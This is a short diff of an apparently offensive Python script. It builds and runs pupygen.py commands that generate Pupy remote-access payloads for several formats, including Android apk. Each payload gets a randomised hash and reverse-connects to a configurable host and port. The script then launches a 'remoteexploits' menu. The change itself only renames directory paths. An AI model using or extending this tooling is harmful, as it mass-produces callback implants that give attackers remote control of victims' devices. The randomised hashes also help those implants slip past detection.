@@ -153,7 +153,7 @@ for key in format_Dict:
         file_extension = "apk"
 
 
-    cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}.{6} --randomize-hash connect --host {7}:{8}".format(
+    cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/EZPZ/payloads/tester/{3}_{4}_{5}.{6} --randomize-hash connect --host {7}:{8}".format(
         payload_Selected,
         OS_Selected,
         Arch_Selected,
@@ -167,4 +167,4 @@ for key in format_Dict:
     print colored(cmd_String,'red','on_white')
     os.system(cmd_String)
 
-os.system('python /root/ArmsCommander/remoteexploits/Pupy_Menu.py')
+os.system('python /root/EZPZ/remoteexploits/Pupy_Menu.py')
